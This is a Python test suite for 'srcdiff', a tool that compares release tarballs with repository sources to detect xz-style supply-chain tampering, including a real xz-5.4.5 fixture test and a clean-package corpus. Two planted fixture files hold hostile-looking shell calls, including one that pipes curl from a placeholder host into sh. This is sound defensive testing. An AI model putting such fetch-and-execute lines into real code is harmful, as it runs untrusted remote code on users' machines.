#!/usr/bin/env python3
"""Plant known divergences, assert srcdiff finds exactly those.

A detector nobody has watched fail is not evidence. Every case here builds two
archives with one deliberate difference and checks both that the difference is
found AND that it lands in the right severity bucket -- a tool that flags
everything is as useless as one that flags nothing.

No network, no pytest. Run it: python3 t/test_srcdiff.py
"""
import base64
import collections
import contextlib
import csv
import hashlib
import io
import os
import site
import subprocess
import sys
import tarfile
import tempfile
from pathlib import Path

HERE = Path(__file__).resolve().parent
SRCDIFF = HERE.parent / "srcdiff.py"

# The corpus section at the bottom calls classify() and report() directly: it
# compares ~6000 real files and building tar archives for that on every run
# would be the slow way to reach the same functions.
sys.path.insert(0, str(HERE.parent))
import srcdiff

BASE = {
    "setup.cfg": b"[metadata]\nname = demo\n",
    "src/demo/__init__.py": b"VERSION = '1.0'\n",
    "src/demo/core.py": b"def run():\n    return 42\n",
    "README.md": b"# demo\n",
}

passed = 0
failed = 0


def make_tar(path, files, root):
    with tarfile.open(path, "w:gz") as tf:
        for name, content in files.items():
            info = tarfile.TarInfo(f"{root}/{name}")
            info.size = len(content)
            tf.addfile(info, io.BytesIO(content))


def run(artifact_files, repo_files, artifact_root="demo-1.0", repo_root="demo-1.0"):
    with tempfile.TemporaryDirectory() as td:
        a = Path(td) / "artifact.tar.gz"
        r = Path(td) / "repo.tar.gz"
        make_tar(a, artifact_files, artifact_root)
        make_tar(r, repo_files, repo_root)
        proc = subprocess.run(
            [sys.executable, str(SRCDIFF), "compare", str(a), str(r)],
            capture_output=True, text=True)
        return proc.returncode, proc.stdout + proc.stderr


def eq(label, got, want):
    """Plain assertion. check() below is the fixture runner, not this."""
    global passed, failed
    if got == want:
        passed += 1
        print(f"ok   {label}")
    else:
        failed += 1
        print(f"FAIL {label}\n       got  {got!r}\n       want {want!r}")


def truthy(label, cond):
    eq(label, bool(cond), True)


def check(label, artifact, repo, want_rc, want_in=None, want_not_in=None, **kw):
    global passed, failed
    rc, out = run(artifact, repo, **kw)
    problems = []
    if rc != want_rc:
        problems.append(f"exit {rc}, want {want_rc}")
    if want_in and want_in not in out:
        problems.append(f"missing {want_in!r} in output")
    if want_not_in and want_not_in in out:
        problems.append(f"unexpected {want_not_in!r} in output")

    if problems:
        failed += 1
        print(f"FAIL {label}")
        for p in problems:
            print(f"       {p}")
        print("     ---- output ----")
        for line in out.strip().splitlines():
            print(f"     {line}")
    else:
        passed += 1
        print(f"ok   {label}")


# ------------------------------------------------------------------ the baseline

check("identical archives are clean",
      BASE, BASE, want_rc=0, want_in="No suspicious findings")

# ------------------------------------------- the xz shape: shipped code, no source

check("extra .py in the artifact is HIGH",
      {**BASE, "src/demo/build_helper.py": b"import os\nos.system('curl evil')\n"},
      BASE,
      want_rc=1, want_in="HIGH")

check("extra .sh in the artifact is HIGH",
      {**BASE, "build-to-host.sh": b"#!/bin/sh\n# the xz one\n"},
      BASE,
      want_rc=1, want_in="HIGH")

check("extra .m4 in the artifact is HIGH",
      {**BASE, "m4/build-to-host.m4": b"dnl injected\n"},
      BASE,
      want_rc=1, want_in="HIGH")

check("extra .so in the artifact is HIGH",
      {**BASE, "src/demo/_fast.so": b"\x7fELF\x02\x01\x01"},
      BASE,
      want_rc=1, want_in="HIGH")

# --------------------------------------------- modified code is MEDIUM, not HIGH

check("changed .py content is MEDIUM",
      {**BASE, "src/demo/core.py": b"def run():\n    return 1337\n"},
      BASE,
      want_rc=1, want_in="MEDIUM")

# ------------------------------------------------ noise that must NOT be flagged

check("PKG-INFO only in the artifact is suppressed",
      {**BASE, "PKG-INFO": b"Metadata-Version: 2.1\n"},
      BASE,
      want_rc=0, want_in="generated", want_not_in="HIGH")

check("egg-info only in the artifact is suppressed",
      {**BASE, "demo.egg-info/SOURCES.txt": b"setup.cfg\n"},
      BASE,
      want_rc=0, want_not_in="HIGH")

check("setuptools-scm _version.py is suppressed",
      {**BASE, "src/demo/_version.py": b"__version__ = '1.0'\n"},
      BASE,
      want_rc=0, want_not_in="HIGH")

check("extra README in the artifact is not code",
      {**BASE, "CHANGELOG.rst": b"1.0\n---\n"},
      BASE,
      want_rc=0, want_not_in="HIGH")

check("line-ending-only difference is not a finding",
      {**BASE, "src/demo/core.py": b"def run():\r\n    return 42\r\n"},
      BASE,
      want_rc=0, want_in="eol-only")

check(".github only in the repo is expected",
      BASE,
      {**BASE, ".github/workflows/ci.yml": b"on: push\n"},
      want_rc=0, want_not_in="HIGH")

check("tests/ only in the repo is expected",
      BASE,
      {**BASE, "tests/test_core.py": b"def test(): pass\n"},
      want_rc=0, want_not_in="HIGH")

# -------------------------------------------------------- missing source is noted

check("source file missing from the artifact is reported, not suspicious",
      BASE,
      {**BASE, "src/demo/extra.py": b"# real source\n"},
      want_rc=0, want_in="repo-only")

# -------------------------------------------- the two roots are named differently

check("differing archive root names still compare",
      BASE, BASE,
      want_rc=0, want_in="No suspicious findings",
      artifact_root="demo-1.0", repo_root="demo-repo-abc123")

# --------------------------------------------------- several findings at once

rc, out = run(
    {**BASE,
     "evil.sh": b"#!/bin/sh\n",
     "src/demo/core.py": b"def run():\n    return 0\n",
     "PKG-INFO": b"Metadata-Version: 2.1\n"},
    BASE)
if rc == 1 and "HIGH" in out and "MEDIUM" in out and "2 suspicious" in out:
    passed += 1
    print("ok   counts HIGH and MEDIUM together, ignores generated")
else:
    failed += 1
    print(f"FAIL mixed findings: exit {rc}")
    for line in out.strip().splitlines():
        print(f"     {line}")

# ============================================================================
# The xz test: a REAL autotools project, from real upstream artifacts.
#
# Everything above is a toy project with four files and one planted divergence.
# This section is the only part that answers the question that matters: does the
# HIGH bucket survive contact with a real release tarball, where HUNDREDS of files
# legitimately differ from git?
#
# The first run said no. Pointed at the genuine xz-5.4.5 release tarball against
# its genuine git tag, srcdiff produced SIXTEEN HIGH findings, all false, and every
# one of them was an m4/*.m4 file present in the tarball and absent from git --
# which is the exact shape of the xz-utils backdoor. The signal would have been one
# line in seventeen. That is not a detector.
#
# The cause is structural: libtoolize and gettextize vendor those macros in from the
# BUILD HOST, so the project's repository is simply the wrong oracle for them. And a
# name-based allowlist cannot help, because build-to-host.m4 is itself a legitimate
# gettext macro -- it ships in /usr/share/aclocal on any machine with gettext
# installed. The attacker did not invent a filename. They shipped a modified copy of
# a real one.
#
# So vendored files are checked against the canonical copy on this host, and the
# version marker (serial / scriptversion / timestamp / VERSION) separates "a
# different upstream release, expected to differ" from "claims to be this exact
# release and is not". The second is the xz signature.
#
# Fixtures are the real m4/ and build-aux/ trees from the real artifacts, trimmed
# to stay committable. The tampered one is the genuine gettext build-to-host.m4
# with its serial intact and a comment appended -- the TECHNIQUE, not the payload.
# Detection keys on provenance and never on recognising malicious content, which is
# the whole reason this approach can work at all.

FIX = HERE / "fixtures"


def run_files(artifact, repo):
    proc = subprocess.run(
        [sys.executable, str(SRCDIFF), "compare", str(FIX / artifact), str(FIX / repo)],
        capture_output=True, text=True)
    return proc.returncode, proc.stdout + proc.stderr


# The three xz fixtures are committed to this repo, so their absence is a
# broken checkout rather than a machine that happens to lack a tool. Skipping
# them silently cost nine of the twenty-five assertions -- including every
# one that touches build-to-host.m4, which is the injection this whole
# program exists to find -- and still exited 0. SRCDIFF_ALLOW_NO_FIXTURES=1
# is there for deliberately running without them.
XZ_FIXTURES = [
    "xz-5.4.5-gittag-vendored.tar.gz",
    "xz-5.4.5-release-vendored.tar.gz",
    "xz-5.4.5-tampered-vendored.tar.gz",
]
missing = [f for f in XZ_FIXTURES if not (FIX / f).exists()]
if not missing:
    GIT = "xz-5.4.5-gittag-vendored.tar.gz"

    rc_clean, clean = run_files("xz-5.4.5-release-vendored.tar.gz", GIT)
    rc_tamp, tamp = run_files("xz-5.4.5-tampered-vendored.tar.gz", GIT)

    def high_lines(out):
        """Paths listed under HIGH-VENDORED."""
        keep, found = False, []
        for line in out.splitlines():
            if "HIGH-VENDORED:" in line:
                keep = True
                continue
            if keep:
                if not line.strip():
                    break
                if line.startswith("  ") and ":" not in line.split()[0]:
                    found.append(line.strip().split()[0])
        return found

    clean_high = high_lines(clean)
    tamp_high = high_lines(tamp)

    # The point of the whole exercise: an unmodified release must not put
    # build-to-host.m4 in the HIGH bucket, and a tampered one must.
    eq("clean release does not flag build-to-host.m4",
          any("build-to-host" in p for p in clean_high), False)
    eq("tampered release DOES flag build-to-host.m4",
          any("build-to-host" in p for p in tamp_high), True)
    eq("and the tampered copy is reported as same-version, different-content",
          "serial 5, same as host, but content differs" in tamp, True)

    # The 22 genuinely-skewed vendored files must stay out of the way in BOTH runs.
    # If this regresses, the signal drowns again exactly as it did the first time.
    truthy("clean run suppresses the vendored version skew",
           "vendored-version-skew" in clean)
    eq("clean run has at most 2 HIGH-VENDORED entries", len(clean_high) <= 2, True)

    # The delta between the two runs must be precisely the injection -- not a
    # general increase in alarm.
    delta = set(tamp_high) - set(clean_high)
    eq("the only new finding is the injected file", len(delta), 1)
    truthy("and it is build-to-host.m4",
           delta and "build-to-host" in next(iter(delta)))

    # Exit status is the CI contract.
    eq("tampered release exits nonzero", rc_tamp, 1)

    # The known survivor is asserted rather than normalised away. nls.m4 differs
    # from this host's copy only because upstream reflowed its header comment
    # without bumping the serial. One false positive in a 687-file tarball, which a
    # human dismisses in ten seconds, is a better place to stop than a
    # normalisation rule broad enough to absorb arbitrary comment changes -- that
    # rule would also absorb an injected comment block.
    eq("the known nls.m4 survivor is still reported, not suppressed",
          any("nls.m4" in p for p in clean_high), True)
elif os.environ.get("SRCDIFF_ALLOW_NO_FIXTURES") == "1":
    print("SKIP xz fixtures absent (SRCDIFF_ALLOW_NO_FIXTURES=1): %s"
          % ", ".join(missing))
    print("SKIP nine assertions not run, including every build-to-host.m4 one")
else:
    failed += 1
    print("not ok  xz fixtures present: missing %s" % ", ".join(missing))
    print("        these are committed to the repo, so this is a broken")
    print("        checkout. Run t/mkxzfixtures.sh to rebuild them, or set")
    print("        SRCDIFF_ALLOW_NO_FIXTURES=1 to run the other 16 only.")

# ============================================================================
# The clean corpus: the false-positive half of the hard invariant, measured.
#
# Everything above plants a divergence and asks whether srcdiff finds it. That
# is only half the invariant. The other half is that a CLEAN package must come
# back clean, and it is the half that killed the first version of this tool: 16
# HIGH findings on a genuine xz-5.4.5 release, every one of them false. A
# detector with no false negatives and sixteen false positives per release is
# not a detector.
#
# So: twenty real packages that nobody here wrote, compared, with the HIGH
# buckets required to be empty across all of them.
#
# WHERE THE CORPUS COMES FROM. Installed Python distributions on this machine,
# in a site-packages directory. Nothing is fetched and nothing is vendored into
# this repository: the trees are read where they already live, and if no
# qualifying directory exists the whole section says so and skips loudly.
#
# HOW "KNOWN-CLEAN" IS ESTABLISHED, per package, on every run. A wheel install
# leaves the publisher's own file manifest behind in <dist>.dist-info/RECORD:
# one line per installed file with its sha256 and size, written by the installer
# from the wheel. Every file the manifest carries a hash for is re-hashed here
# and must still match, and a distribution that fails is DROPPED from the corpus
# and named, not counted. That is an outside authority: the manifest was written
# by pip from the publisher's artifact, not by this suite.
#
# It is also a limited one, and the limit matters. It establishes that the tree
# on disk is byte-for-byte the artifact that was published. It does NOT
# independently establish that the published artifact matched its upstream
# repository, which is the thing srcdiff exists to check. No machine-local
# oracle can: that claim needs the repository, and the repository is on the
# network. So the corpus measures false positives against a manifest, not
# against a git tree, and the xz fixtures above remain the only place where a
# real artifact meets a real repository.
#
# WHAT THE TWO SIDES ARE.
#   artifact = every file actually on disk under the distribution's own
#              top-level directories, found by walking the filesystem.
#   repo     = the files the publisher's manifest accounts for, minus the ones
#              the installer creates after unpacking (__pycache__/*.pyc and the
#              .dist-info metadata directory itself).
#
# The two sides come from independent authorities -- a directory walk and a
# manifest -- which is what makes a zero-HIGH result mean anything. A .py file
# sitting in a package directory that no manifest accounts for lands in HIGH,
# exactly as a .py in a tarball that no repository accounts for does. That is
# reachable for every one of the ~2000 code files here, and the planted-defect
# cases at the end of this section prove it is reachable by actually reaching
# it. A corpus that could not go red would be measuring nothing.
#
# classify() is called in-process rather than through a subprocess and two tar
# archives, because the corpus is ~6000 files and the suite should stay quick.
# The pass/fail decision is still srcdiff's own: report() returns the exit
# status, and that status is what is asserted, so the CI contract is checked
# per package and not re-derived here.
#
# shortcut: the repo side is a publisher manifest, not a repository, so this
# measures one false-positive class (artifact files nothing accounts for) and
# not the full sdist-against-git divergence. The upgrade path is plan item 07,
# an on-disk download cache: once a fetched sdist and its git tag survive
# between runs, the corpus can be twenty real pairs and this becomes the
# offline fallback.
#
# WHICH DEFECTS THIS CORPUS CATCHES, measured by mutating srcdiff.py rather
# than guessed. is_code() forced to True -- the flags-everything failure the
# false-positive half of the invariant exists to prevent -- turns all twenty
# packages red with 151 HIGH. is_code() forced to False fails the planted
# cases below, so the section cannot pass while HIGH detection is dead.
# Two mutations it does NOT catch, and they are worth knowing: adding ".pyc"
# to CODE_EXT, and deleting the .pyc rule from GENERATED, each leave the
# corpus green, because the 2135 .pyc files here are held back by BOTH the
# suppression rule and the extension list and either alone is enough. A clean
# run of this corpus is therefore not evidence about the .pyc rule.

CORPUS_WANT = 20            # the plan item says twenty packages
CORPUS_MIN_COMPARISONS = 4000   # a zero over nothing compared proves nothing


def corpus_roots():
    # The override wins outright rather than being tried first, so that
    # pointing it at a directory with no distributions in it exercises the
    # skip path. A skip nobody has watched happen is a skip that silently
    # eats the whole section.
    env = os.environ.get("SRCDIFF_CORPUS_SITE_PACKAGES")
    if env:
        return [Path(env)] if Path(env).is_dir() else []
    roots = [Path(p) for p in site.getsitepackages()]
    # A virtualenv one level down in $HOME. Distribution-packaged site-packages
    # tends to have RECORD stripped, so this is usually where the manifests are.
    roots += sorted(Path.home().glob("*/.venv/lib/python3*/site-packages"))
    out = []
    for r in roots:
        if r.is_dir() and r not in out:
            out.append(r)
    return out


def record_rows(dist_info):
    # path, sha256=<urlsafe-b64, unpadded>, size. Rows whose path escapes
    # site-packages (console scripts at ../../../bin/...) are not part of the
    # package tree and are not compared.
    rec = dist_info / "RECORD"
    if not rec.is_file():
        return None
    text = rec.read_text(encoding="utf-8", errors="replace")
    rows = [r for r in csv.reader(text.splitlines()) if r and r[0]]
    return [r for r in rows if not r[0].startswith(("..", "/"))]


def record_verified(root, rows):
    # Returns the number of files checked, or None if anything disagrees with
    # the manifest. RECORD itself and the .pyc files the installer compiles
    # carry no hash and are skipped -- they are not what the publisher shipped.
    n = 0
    for row in rows:
        if len(row) < 2 or not row[1].startswith("sha256="):
            continue
        f = root / row[0]
        if not f.is_file():
            return None
        digest = base64.urlsafe_b64encode(
            hashlib.sha256(f.read_bytes()).digest()).rstrip(b"=").decode()
        if digest != row[1][len("sha256="):]:
            return None
        n += 1
    return n


def is_install_product(path):
    # Written on this machine after the wheel was unpacked, so it belongs on the
    # artifact side only -- the same relationship an sdist's PKG-INFO has to the
    # repository it was built from.
    return ("__pycache__/" in path or path.endswith((".pyc", ".pyo"))
            or ".dist-info/" in path)


def corpus_select(root):
    # Deterministic, no cherry-picking: every distribution that qualifies, the
    # largest CORPUS_WANT of them taken. Rejections are returned with a reason
    # so the corpus cannot quietly shrink to something trivial.
    chosen, dropped, manifest = [], [], set()
    for di in sorted(root.glob("*.dist-info")):
        rows = record_rows(di)
        if rows is None:
            dropped.append((di.name, "no RECORD manifest"))
            continue
        # Every manifest in the directory, including the dropped ones: packages
        # share namespace directories (google/, zope/), so a file under one
        # distribution's tree may legitimately belong to another's manifest.
        manifest.update(r[0] for r in rows)
        direct = di / "direct_url.json"
        if direct.is_file() and b'"editable": true' in direct.read_bytes():
            dropped.append((di.name, "editable install, no shipped tree"))
            continue
        if any(r[0].endswith((".so", ".pyd", ".dll", ".dylib")) for r in rows):
            # Compiled objects are a non-goal (PLAN.md: wheels need a different
            # comparison), and reading them would make the suite slow.
            dropped.append((di.name, "ships compiled objects"))
            continue
        if sum(1 for r in rows if not r[0].startswith(di.name + "/")) < 10:
            dropped.append((di.name, "fewer than 10 files outside .dist-info"))
            continue
        verified = record_verified(root, rows)
        if verified is None:
            dropped.append((di.name, "RECORD verification FAILED"))
            continue
        chosen.append((len(rows), di.name, rows, verified))
    chosen.sort(key=lambda c: (-c[0], c[1]))
    return chosen, dropped, manifest


def corpus_pair(root, rows, manifest):
    tops = sorted({r[0].split("/")[0] for r in rows})
    artifact, repo = {}, {}
    for top in tops:
        p = root / top
        found = sorted(p.rglob("*")) if p.is_dir() else ([p] if p.is_file() else [])
        for f in found:
            if not f.is_file():
                continue
            rel = str(f.relative_to(root))
            data = f.read_bytes()
            artifact[rel] = data
            if rel in manifest and not is_install_product(rel):
                repo[rel] = data
    # Accounted for by the manifest and absent from the tree: that is the
    # repo-only direction, and it must show up rather than be skipped.
    for m in manifest:
        if (m.split("/")[0] in tops and m not in artifact
                and not is_install_product(m)):
            repo[m] = b""
    return artifact, repo


def corpus_run(pairs, inject=None):
    # pairs are built once and reused, so the planted-defect runs below go
    # through exactly the same comparison as the clean run and not a second,
    # separately-read copy of it.
    totals = collections.Counter()
    comparisons = 0
    red = []
    for i, (name, artifact, repo) in enumerate(pairs):
        if inject and i == 0:
            artifact = dict(artifact)
            artifact.update(inject)
        findings = srcdiff.classify(artifact, repo)
        buf = io.StringIO()
        with contextlib.redirect_stdout(buf):
            status = srcdiff.report(findings)
        comparisons += len(set(artifact) | set(repo))
        for k, v in findings.items():
            totals[k] += len(v)
        if status:
            red.append(name)
        if not inject:
            eq("corpus %s: %d files, %d HIGH, exit %d"
               % (name, len(artifact), len(findings.get("HIGH", [])), status),
               (len(findings.get("HIGH", [])), len(findings.get("HIGH-VENDORED", [])),
                status), (0, 0, 0))
    return comparisons, totals, red


corpus_root = None
for _r in corpus_roots():
    _chosen, _dropped, _manifest = corpus_select(_r)
    if len(_chosen) >= CORPUS_WANT:
        corpus_root = _r
        _entries = _chosen[:CORPUS_WANT]
        break

if corpus_root is None:
    # Not committed to this repo and not fetchable, so absence is a property of
    # the machine, not a broken checkout. Loud, and with the count of what did
    # not run, because a silent skip is how a suite reports passing while
    # checking nothing.
    print("SKIP corpus: no site-packages with %d qualifying distributions" % CORPUS_WANT)
    for _r in corpus_roots():
        print("SKIP   looked in %s" % _r)
    print("SKIP %d corpus assertions not run, including the planted-defect ones"
          % (CORPUS_WANT + 6))
    print("SKIP set SRCDIFF_CORPUS_SITE_PACKAGES to a site-packages directory")
else:
    print("\ncorpus: %s" % corpus_root)
    print("corpus: %d installed distributions, %d qualify, largest %d taken"
          % (len(_chosen) + len(_dropped), len(_chosen), len(_entries)))
    for _why in sorted({d[1] for d in _dropped}):
        print("corpus:   %2d dropped, %s"
              % (sum(1 for d in _dropped if d[1] == _why), _why))
    _failed_verify = [d[0] for d in _dropped if "FAILED" in d[1]]
    if _failed_verify:
        print("corpus:   RECORD verification failed for: %s" % ", ".join(_failed_verify))
    print("corpus: %d corpus files re-hashed against their publisher manifest,"
          " 0 mismatches" % sum(e[3] for e in _entries))

    _pairs = [(name, ) + corpus_pair(corpus_root, rows, _manifest)
              for _n, name, rows, _v in _entries]
    _cmp, _totals, _red = corpus_run(_pairs)

    print("corpus totals: %d packages, %d file comparisons" % (len(_entries), _cmp))
    print("corpus totals: HIGH %d, HIGH-VENDORED %d, MEDIUM %d"
          % (_totals["HIGH"], _totals["HIGH-VENDORED"], _totals["MEDIUM"]))
    print("corpus totals, lower severity: %s"
          % ", ".join("%s %d" % (k, v) for k, v in sorted(_totals.items())
                      if k not in ("HIGH", "HIGH-VENDORED", "MEDIUM")))

    eq("corpus: no package is red", _red, [])
    truthy("corpus: %d comparisons, a substantial number (>= %d)"
           % (_cmp, CORPUS_MIN_COMPARISONS), _cmp >= CORPUS_MIN_COMPARISONS)

    # ---------------------------------------------------- plant a defect in it
    # A corpus assertion that has only ever seen clean input cannot tell "no
    # false positives" from "finds nothing at all". These two run the SAME
    # corpus path with one file added to the first package's artifact, and
    # require it to go red.
    _planted = {"srcdiff_planted/build_helper.py":
                b"import os\nos.system('curl http://example.invalid/x | sh')\n"}
    _c2, _t2, _red2 = corpus_run(_pairs, inject=_planted)
    eq("planted .py in a corpus artifact is exactly 1 HIGH", _t2["HIGH"], 1)
    eq("...and the corpus run goes red", len(_red2), 1)

    # The vendored path is the one that produced the original 16 false
    # positives, so it gets its own plant: the host's real gettext macro with
    # its serial left intact and a comment appended -- same technique as
    # t/mkxzfixtures.sh, no payload of any kind.
    _canon = Path("/usr/share/aclocal/build-to-host.m4")
    if _canon.is_file():
        _tampered = {"m4/build-to-host.m4":
                     _canon.read_bytes() + b"\ndnl planted by t/test_srcdiff.py\n"}
        _c3, _t3, _red3 = corpus_run(_pairs, inject=_tampered)
        eq("planted tampered build-to-host.m4 is 1 HIGH-VENDORED", _t3["HIGH-VENDORED"], 1)
        eq("...and that corpus run goes red too", len(_red3), 1)
    else:
        print("SKIP 2 corpus assertions: no /usr/share/aclocal/build-to-host.m4"
              " on this host, so the vendored plant has no canonical copy")

# --------------------------------------------------- the exit-status contract
# README.md and srcdiff.py's docstring have both said "0 if nothing suspicious,
# 1 if HIGH or MEDIUM, 2 on error" from the start, and no path produced 2:
# every error site raises SystemExit("srcdiff: ..."), which Python exits 1 for,
# and main() returns only 0 or 1. So "could not answer" and "answered and found
# something" were one status, in a tool whose PLAN calls that status the
# contract making it usable from CI without parsing output. An unreadable path
# was worse still -- a traceback and exit 1, so a typo read as a finding.
#
# Three statuses, asserted. 0 and 1 come from the fixtures above; these are the
# error paths.
def status_of(*argv):
    return subprocess.run([sys.executable, str(SRCDIFF)] + list(argv),
                          capture_output=True, text=True)

for argv, want, label in [
    (["compare", "/nonexistent/a", "/nonexistent/b"], 2, "an unreadable path"),
    (["compare", str(HERE / "test_srcdiff.py"), str(HERE / "test_srcdiff.py")],
     2, "an archive that is not an archive"),
    (["--help"], 0, "--help"),
    # No PyPI case here on purpose: every other assertion in this file is
    # offline, and an error path that needs the network would turn a lost
    # connection into a failed contract test.
]:
    r = status_of(*argv)
    eq("exit 2 contract: %s" % label, r.returncode, want)
    if want == 2:
        truthy("...and %s says what went wrong, with no traceback" % label,
               "srcdiff:" in r.stderr and "Traceback" not in r.stderr)

print(f"\n{passed} passed, {failed} failed")
sys.exit(1 if failed else 0)
